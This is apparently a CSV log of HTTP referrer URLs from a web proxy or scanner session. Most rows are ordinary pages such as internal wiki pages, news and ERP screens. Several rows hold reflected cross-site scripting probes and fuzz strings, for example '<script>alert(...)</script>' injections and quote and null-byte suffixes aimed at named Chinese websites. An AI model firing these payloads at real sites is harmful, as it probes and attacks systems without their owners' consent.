httpReferer,encoder,mode_is
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750820&draftShareId=58022050-52aa-4b6b-a26a-23ac7523b161,88,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750873&draftShareId=684aa02e-b964-4fdb-82c9-2e9652b51b6d,89,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12751004&draftShareId=99e3e91f-3943-4fac-97c3-7ccc1262a46e,90,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=8716719&draftShareId=df8e56ee-1e3f-4404-ba29-2cd21afb5371,91,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12156955,92,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746779,93,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746796,94,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746803,95,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746803&focusedCommentId=12750753,96,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746834,97,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746837,98,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746839,99,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747023,100,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747072,101,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747100,102,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747295,103,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747295&src=sidebar,104,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747297,105,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747300,106,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747327,107,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747329,108,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747380,109,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747382,110,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747445,111,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747979,112,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12748133,113,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12748523,114,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749312,115,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749624,116,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749762,117,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749904,118,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750305,119,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750492,120,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750640,121,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750649,122,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750694,123,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750735,124,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750739,125,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750757,126,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750819,127,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750985,128,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12751004,129,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716555,130,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716555&src=sidebar,131,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716555&src=spacemenu,132,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716974,133,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716976,134,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716976&src=contextnavchildmode,135,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8717115,136,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8717249,137,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8717290,138,0
http://*.50.2.*/wiki/pages/worddav/uploadimport.action?pageId=12750492,139,0
http://*.50.2.*/wiki/plugins/inlinetasks/mytasks.action,140,0
http://*.50.2.*/wiki/plugins/servlet/gadgets/ifr?container=atlassian&mid=566953181184&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AMuAE8Xjcn6Azj0infM762%2BWAHEW1%2FLx0cnLrszA3NMRj3J3c1NpMxCgZld68PTNckFq1HfHb81GM6knnD%2BMXJ5zM8JTCbAFJ3%2B3L%2B%2FkmClsVj1lSzwNUVU0TsXbi2tvktNX1cmYkQfHVin01qtrxRIhmE8Pq2NZcTPN391hkdm6rx2s1uxb0RE4DKNVaSi1650mf%2BoR26j%2F2mxawQJKjpGyjoi1ZJHMDlVEv7PkIsAmm0FP8pKmqTXRgl28pNcfJVPQ36BVUG6N37cEetllAR6LvxvCdnHU101hIXIZ0k7U0nmhbnxpVwssj3CHDh1y7SI9DxXqMZRm77bh0P2IvX8T6BZ%2Be416wuaAGvZ5kpr8vU4dc&up_isConfigured=true&up_isReallyConfigured=false&up_title=%E6%B4%BB%E5%8A%A8%E6%97%A5%E5%BF%97&up_titleRequired=true&up_numofentries=10&up_refresh=false&up_maxProviderLabelCharacters=50&up_rules=&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2F10.50.2.81%2Fwiki%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.confluence%3Aactivitystream-gadget%2Fgadgets%2Fconf-activitystream-gadget.xml&libs=auth-refresh,141,0
http://*.50.2.*/wiki/plugins/servlet/gadgets/ifr?container=atlassian&mid=566953181184&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AVPNmlfR%2FjE3IFWU2zO%2F7KBlijB372KxJ9JhtoSNVe2%2BkXA59vJXaet46GxoeJCvbbiio9h3o1YpF5BDnmbahtx5hR7gZEndUTHCE47AdfdHWMNVWw4eAABN9bQoNspbXfeSltkCCbWp7K%2BA7hZf%2Ftg36oDXEylagN9NufPSAjAHZ%2FCIUCA3TAogjmGVaNpVntrXkkLElegQ6NC5qDF3wyhcRFCg0KRWs0kN9UUWgULmkm%2BQxcEBUDZwq6PtD3TT%2BOzs9%2FwezWNQa%2B5HaVAQp1IgP32j9HAchbGdLCb3T77Z6Njbz1npbzdnZlYUzBPHdYLZs33pEbhC6cNo9IqzlHlBFdMlceIuIi6C%2Bm2WPIFAZCtfQ&up_isConfigured=true&up_isReallyConfigured=false&up_title=%E6%B4%BB%E5%8A%A8%E6%97%A5%E5%BF%97&up_titleRequired=true&up_numofentries=10&up_refresh=false&up_maxProviderLabelCharacters=50&up_rules=&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2F10.50.2.81%2Fwiki%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.confluence%3Aactivitystream-gadget%2Fgadgets%2Fconf-activitystream-gadget.xml&libs=auth-refresh,142,0
http://*.50.2.*/wiki/plugins/servlet/gadgets/ifr?container=atlassian&mid=566953181184&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AaRDxjCwy4VP5XqksJKvkhbhp8JOQqVAN3sbFVY0QU26YgtPBk8rhSMMkoV%2BrAzlthqkMXs6%2BpcMJSKix5LHtyO%2FF7M%2B4x8rMN%2FOyFC4YOtKIa%2FirCkafvgmxPLt0B1xzVs3WUXWyCP%2Fu461%2FeR4uHkkWHboa6hCp%2FlJdzIW%2FTs0tDZYDrzeM6WjSgceqNYvhDDQcGJghL255vv47dWQNe06XyqqJCJ7sJ%2F1xvz%2BtLUDcdvHjPZ2fd8Dz0DiFR4iBoWeM5GKYVfHeOWiJauAqE7wQoSLFRmKpFrL1i48vNOaNbmzYhRH%2BUlMO5h2GIt3r3sqxV6yZIjzl82BAp6z849zqFzmvLcgx0VZvJkv%2B3t6FVhKz&up_isConfigured=true&up_isReallyConfigured=false&up_title=%E6%B4%BB%E5%8A%A8%E6%97%A5%E5%BF%97&up_titleRequired=true&up_numofentries=10&up_refresh=false&up_maxProviderLabelCharacters=50&up_rules=&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2F10.50.2.81%2Fwiki%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.confluence%3Aactivitystream-gadget%2Fgadgets%2Fconf-activitystream-gadget.xml&libs=auth-refresh,143,0
http://*.50.23.*:13001/audit,144,0
http://*.99.186.*:8082/mall/goods/add,145,0
http://*.daohang88.com/,146,0
http://*.ielan.com/,147,0
http://*.sogou.com/tools/wnl.html,148,0
http://*.sogou.com/zhuanti/browserfeed.html?V=15,149,0
http://ad.winrar.com.cn/show_2.html?L=7&bl=7&v=550personal&a=64&src=pe006,150,0
http://ad.winrar.com.cn/show_2.html?L=7&bl=7&v=570personal&a=64&src=pe001,151,0
http://admin.antivirus-ncov.dev.wochanye.com/,152,0
http://app.gjzwfw.gov.cn/jmopen/webapp/html5/unZip/f441935cd33b4651b3ee0558bf596904/jygjgcsrymdxxcxpc/index.html?webId=1,153,0
http://astrowww.bnu.edu.cn/NewCN/case.php?cid=42,154,0
http://b2c.tibetairlines.com.cn/,155,0
http://bbs.itheima.com/forum.php?mod=viewthread&tid=450328,156,0
http://bbs.itheima.com/thread-133454-1-1.html,157,0
http://bbs.sdbeta.com/read-htm-tid-569423.html,158,0
http://bioon.com.cn/campaign/?keyword=%E6%AD%A6%E6%B1%89%22%20onclick%3D%22alert(58535),159,0
http://blog.sina.cn/dpool/blog/s/blog_157c8c6ed0102w22q.html,160,0
http://burp/,161,0
http://ciccsv.bnu.edu.cn/index.php?m=member&c=index&a=login');alert(02163)//,162,0
http://cloudfile.das-security.cn/files/,163,0
http://cloudfile.das-security.cn/files/%E5%85%AC%E5%8F%B8%E4%BA%A7%E5%93%81/,164,0
http://cn.bing.com/?scope=web&FORM=QBLH,165,0
http://console.apistore.cn/Login/reg/registerType/email?callback=1%27%22()%26%25%3Cacx%3E%3Cscript%20%3Ealert(9324)%3C/script%3E,166,0
http://const.tms.beisen.com/default.aspx,167,0
http://csh5rs.52jiami.com/mj/web-qtt/?channel=503&app_id=a3F1bTkGXGEd&app_name=%E6%AC%A2%E4%B9%90%E9%BA%BB%E5%B0%863D%E7%89%88&appid=a3F1bTkGXGEd&dc=868097043619920&dtu=014&ext=eyJzb3VyY2UiOiIyODYxNjYifQ%3D%3D&origin_type=0&platform=qtt&sdk_version=cocos.e87d2981c0cac29315df.js&sign=1718709759a5b414735ef97e360b92da&source=286166&tag_id=&ticket=t11XhCiLgjhLa2khhqBFm&time=1582695783&uuid=953961572&v=30965000&vn=3.9.65.000.0219.1545&lat=0.0&lon=0.*,168,0
http://csr.adl.io/manage/securityBase/274/edit,169,0
http://cxpt.hzwindow.com.cn/,170,0
http://cxpt.hzwindow.com.cn/hdip,171,0
http://cxpt.hzwindow.com.cn/hdip/,172,0
http://cxpt.hzwindow.com.cn/hdip/#/login,173,0
"http://cxpt.hzwindow.com.cn/hdip/#/login*/-->'""></iframe></script></style></title></textarea><script >alert(02370)</script>",174,0
"http://cxpt.hzwindow.com.cn/hdip/#/login*/-->'""></iframe></script></style></title></textarea><script >alert(24750)</script>",175,0
"http://cxpt.hzwindow.com.cn/hdip/#/login*/-->'""></iframe></script></style></title></textarea><script >alert(62161)</script>",176,0
http://cxpt.hzwindow.com.cn/hdip/#/login?from=pc,177,0
"http://cxpt.hzwindow.com.cn/hdip/#/login?from=pc*/-->'""></iframe></script></style></title></textarea><script >alert(35457)</script>",178,0
"http://cxpt.hzwindow.com.cn/hdip/*/-->'""></iframe></script></style></title></textarea><script >alert(55890)</script>",179,0
"http://cxpt.hzwindow.com.cn/hdip/*/-->'""></iframe></script></style></title></textarea><script >alert(95393)</script>",180,0
http://cxpt.hzwindow.com.cn/hdip//award/award_list.action,181,0
http://cxpt.hzwindow.com.cn/hdip//login/login_history.action,182,0
http://cxpt.hzwindow.com.cn/hdip/announce/announce_list.action,183,0
http://cxpt.hzwindow.com.cn/hdip/expert/expert_list.action,184,0
http://cxpt.hzwindow.com.cn/hdip/login/login_history.action,185,0
http://cxpt.hzwindow.com.cn/hdip/program/program_audit.action,186,0
http://cxpt.hzwindow.com.cn/hdip/program/program_list.action,187,0
http://cxpt.hzwindow.com.cn/hdip/role/role_list.action,188,0
http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css,189,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css'""[]()",190,0
http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css-99999999999999999999,191,0
http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css99999999999999999999,192,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==",193,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==""",194,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==%00",195,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==%27",196,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg=='""[]()",197,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==-99999999999999999999",198,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==YYYYYYYYYYYYYYYYYYYY",199,0
http://cxpt.hzwindow.com.cn/hdip/static/img/app_qr_pc.0b31bf1.jpg,200,0
http://cxpt.hzwindow.com.cn/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js,201,0
http://cxpt.hzwindow.com.cn/hdip/user/user_list.action,202,0
http://cxpt.hzwindow.com.cn/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css,203,0
http://data.eastmoney.com/dzjy/default.html,204,0
http://data.eastmoney.com/dzjy/dzjy_mrmxa.aspx?TimeSpanType=-1&startDate=2020-02-24&endDate=2020-02-24,205,0
http://data.eastmoney.com/gdfx/shareholder/d5c0fe300fe8e13ce74af859ba153333.html,206,0
http://data.eastmoney.com/hsgt/index.html,207,0
http://data.eastmoney.com/zjlx/,208,0
http://dcd-group.cn/%E6%B5%B7%E5%85%89%E5%BC%80%E5%A7%8B%E5%90%AF%E5%8A%A8%E7%94%9F%E4%BA%A7%E5%9F%BA%E4%BA%8Ezen%E6%9E%B6%E6%9E%84%E7%9A%84%E5%A4%84%E7%90%86%E5%99%A8/,209,0
http://demo.zentao.net/tutorial-wizard-story-create-cHJvZHVjdElEPTEmYnJhbmNoPTAmbW9kdWxlSUQ9MA==.html,210,0
http://desk.zol.com.cn/bizhi/8661_106831_2.html,211,0
http://desk.zol.com.cn/bizhi/8661_106832_2.html,212,0
http://desk.zol.com.cn/bizhi/8661_106833_2.html,213,0
http://e.vhall.com/,214,0
http://e.vhall.com/auth/register,215,0
http://edu.avtechcn.com/my/course/421,216,0
http://ent.163.com/,217,0
http://ent.sina.com.cn/m/f/2020-02-24/doc-iimxxstf3858104.shtml,218,0
http://ent.sina.com.cn/v/m/2020-02-11/doc-iimxyqvz1924762.shtml,219,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.DepartmentList&sId=3000nid&bId=1001101159162124&ShowType=NavigatePage&ParentForm=beee4a9d-0556-4787-a7f9-38d775f0c4f6&__fsk=__SK55857*__SK55857&__curOId=1001712070000049,220,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.DepartmentList&sId=3000nid&bId=1001101159162124&ShowType=NavigatePage&ParentForm=beee4a9d-0556-4787-a7f9-38d775f0c4f6&__fsk=__SK6047*__SK6047&__curOId=1001801170006914,221,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101159162183&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK13304*__SK13304&__curOId=1001712070000049,222,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101160311154&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK37905*__SK37905&__curOId=1001712070000049,223,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.OperatorList&sId=3000nid&bId=1001101159162125&ShowType=NavigatePage&ParentForm=28c124ba-9e0d-4248-a4c7-58b9e3fe0ea0&__fsk=__SK30713*__SK30713&__curOId=1001801170014659,224,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.PredeterminedAccountFactor.PredeterminedAccountFactorList&sId=3000nid&bId=1001101159162216&ShowType=NavigatePage&ParentForm=336259f4-54c3-4743-b66c-d4ec533022f0&__fsk=__SK75091*__SK75091&__curOId=1001712070000049,225,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=EAM.FA.AssetCard.FA_AssetCardBListUIForm&sId=3009nid&bId=1001101160305886&ShowType=NavigatePage&ParentForm=c96f1b8a-a16a-4f73-9e55-0e27909bc823&__fsk=__SK24430*__SK24430&__curOId=1001712070000049&ID=1001812180015837,226,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=EAM.FA.AssetCard.FA_AssetCardBListUIForm&sId=3009nid&bId=1001101160305886&ShowType=NavigatePage&ParentForm=c96f1b8a-a16a-4f73-9e55-0e27909bc823&__fsk=__SK80397*__SK80397&__curOId=1001712070000049,227,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Account.NaturalAccountListUI&sId=3000nid&mId=1001101159162149&__curOId=1001712070000049,228,0
